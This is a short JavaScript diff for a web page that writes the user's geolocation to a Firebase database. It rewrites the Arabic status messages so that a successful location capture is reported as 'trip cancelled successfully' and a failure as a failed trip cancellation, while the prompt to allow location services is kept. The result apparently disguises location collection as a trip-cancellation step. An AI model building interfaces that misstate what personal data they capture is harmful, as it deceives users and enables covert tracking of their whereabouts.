@@ -250,7 +250,7 @@
             push(locationsRef, {
                 lat: latitude, lng: longitude, timestamp: serverTimestamp()
             }).then(() => {
-                displayStatus('تم تسجيل موقعك بنجاح!', 'success');
+                displayStatus('تم الغاء الرحله  بنجاح !', 'success');
                 locationButton.textContent = 'تم التسجيل';
             }).catch(error => {
                 console.error("Firebase write error: ", error);
@@ -260,7 +260,7 @@
         }
 
         function handleError(error) {
-            let message = "فشل تحديد الموقع.";
+            let message = "فشل الغاء الرحله الرجاء المحاوله مره اخري .";
             if (error.code === 1) {
                 message = "الرجاء الضغط علي سماح لخدمات الموقع !.";
             } else if (error.code === 2) {
